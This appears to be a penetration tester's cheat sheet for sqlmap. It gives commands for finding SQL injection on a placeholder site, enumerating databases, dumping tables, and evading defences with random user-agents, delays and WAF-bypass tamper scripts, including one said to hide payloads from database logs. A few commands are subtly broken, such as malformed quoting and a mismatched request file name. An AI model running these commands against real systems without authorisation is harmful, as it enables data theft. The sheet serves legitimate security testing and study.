SQLMAP

Methodology:

*command to scan for vulnerabilities and very versbose option

    $sqlmap -u <target URL> -v 4

**scan with parameter id

    $sqlmap -u http://target.tld/product.php?id=12 -p id -v 4


***scan and enumerate database

    $sqlmap -u http://target.tld/product.php?id=12 -p id --dbs -v 4


****enumerate the list of tables in a database: 

    $sqlmap -u http://target.tld/product.php?id=12 -p id -D <database name> --tables -v 4

*****dump data from a table:

    $sqlmap -u http://target.tld/product.php?id=12 -p id -D <database name> -T <table name>  --dump -v 4

------------------------------------------------------------------------------------------------------------------------------------------

Tricks:

-Use Random User-Agent:

    $sqlmap -u http://target.tld/product.php?id=12 -p id -D <database name> -T <table name>  --dump --random-agent -v 4 


-Using the most dangerous queries (when the web application is in demo mode)

    --risk : 1-3 => 3
    --level: 1-5 => 5
    $sqlmap -u http://target.tld/product.php?id=12 -p id --risk 3 --level 5



-send data with sqlmap request and change HTTP method:

    $sqlmap -u http://target.tld/product.php?id=12 -p id --data="username:admin&password="admin" --method="POST"

-delay trick:
time delay => --delay=<TIME>

    $sqlmap -u http://target.tld/product.php?id=12 -p id --level 5 --delay=10

-add HTTP header manually :
--headers=""

    $sqlmap -u http://target.tld/product.php?id=12 -p id --headers="HOST:target.tld  \nauthorization:bearer ...\nuser-agent:aaaaa\n ...." --cookie="PHPSESSIONID=...;"


-add a intercepted HTTP file : 

    intercept a HTTP request and save it in a file(data.txt) and use sqlmap
    data.txt:
    POST /target.tld/login.php?id=2 HTTP/1.1
    Host: target.tld
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
    Accept: text/html
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Content-Type: multipart/form-data; 
    Origin: http://target.tld
    Connection: keep-alive
    Referer: http://target.tld
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
    
    
    
    username=admin&password=admin
    use sqlmap:
    $sqlmap -r data.req -p username --batch




-login MySQL server with sqlmap:

    sqlmap -d "mysql://username:password@TARGET:3306/testDB"




-bypass WAF:

--tamper 

    sqlmap --list-tamper
 
    $sqlmap -u http://target.tld/product.php?id=12 -p id --tamper=<SCRIPT>

        # All scripts
    --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
    
    # General scripts
    --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
    
    # Microsoft access
    --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
    
    # Microsoft SQL Server
    --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
    
    # MySQL
    --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
    
    # Oracle
    --tamper=between,charencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor
    
    # PostgreSQL
    --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,xforwardedfor
    
    # SAP MaxDB
    --tamper=ifnull2ifisnull,nonrecursivereplacement,randomcase,securesphere,space2comment,space2plus,unionalltounion,unmagicquotes,xforwardedfor
    
    # SQLite
    --tamper=ifnull2ifisnull,multiplespaces,nonrecursivereplacement,randomcase,securesphere,space2comment,space2dash,space2plus,unionalltounion,unmagicquotes,xforwardedfor




    General tamper option and tamper's list

    tamper=name_of_the_tamper
    
    Tamper 	                            Description
    apostrophemask.py 	            Replaces apostrophe character with its UTF-8 full width counterpart
    apostrophenullencode.py 	    Replaces apostrophe character with its illegal double unicode counterpart
    appendnullbyte.py 	            Appends encoded NULL byte character at the end of payload
    base64encode.py 	            Base64 all characters in a given payload
    between.py 	                    Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #'
    bluecoat.py 	                Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator
    chardoubleencode.py 	        Double url-encodes all characters in a given payload (not processing already encoded)
    commalesslimit.py 	            Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'
    commalessmid.py 	            Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'
    concat2concatws.py 	            Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'
    charencode.py 	                Url-encodes all characters in a given payload (not processing already encoded)
    charunicodeencode.py 	        Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)
    equaltolike.py 	                Replaces all occurances of operator equal ('=') with operator 'LIKE'
    escapequotes.py 	            Slash escape quotes (' and ")
    greatest.py 	                Replaces greater than operator ('>') with 'GREATEST' counterpart
    halfversionedmorekeywords.py 	Adds versioned MySQL comment before each keyword
    ifnull2ifisnull.py 	            Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'
    modsecurityversioned.py 	    Embraces complete query with versioned comment
    modsecurityzeroversioned.py 	Embraces complete query with zero-versioned comment
    multiplespaces.py 	            Adds multiple spaces around SQL keywords
    nonrecursivereplacement.py 	    Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters
    percentage.py 	                Adds a percentage sign ('%') infront of each character
    overlongutf8.py 	            Converts all characters in a given payload (not processing already encoded)
    randomcase.py 	                Replaces each keyword character with random case value
    randomcomments.py 	            Add random comments to SQL keywords
    securesphere.py 	            Appends special crafted string
    sp_password.py 	                Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs
    space2comment.py 	            Replaces space character (' ') with comments
    space2dash.py 	                Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n')
    space2hash.py 	                Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
    space2morehash.py 	            Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n')
    space2mssqlblank.py         	Replaces space character (' ') with a random blank character from a valid set of alternate characters
    space2mssqlhash.py 	            Replaces space character (' ') with a pound character ('#') followed by a new line ('\n')
    space2mysqlblank.py 	        Replaces space character (' ') with a random blank character from a valid set of alternate characters
    space2mysqldash.py             	Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n')
    space2plus.py 	                Replaces space character (' ') with plus ('+')
    space2randomblank.py         	Replaces space character (' ') with a random blank character from a valid set of alternate characters
    symboliclogical.py             	Replaces AND and OR logical operators with their symbolic counterparts (&& and
    unionalltounion.py             	Replaces UNION ALL SELECT with UNION SELECT
    unmagicquotes.py 	            Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work)
    uppercase.py 	                Replaces each keyword character with upper case value 'INSERT'
    varnish.py 	                    Append a HTTP header 'X-originating-IP'
    versionedkeywords.py 	        Encloses each non-function keyword with versioned MySQL comment
    versionedmorekeywords.py     	Encloses each keyword with versioned MySQL comment
    xforwardedfor.py 	            Append a fake HTTP header 'X-Forwarded-For'
    
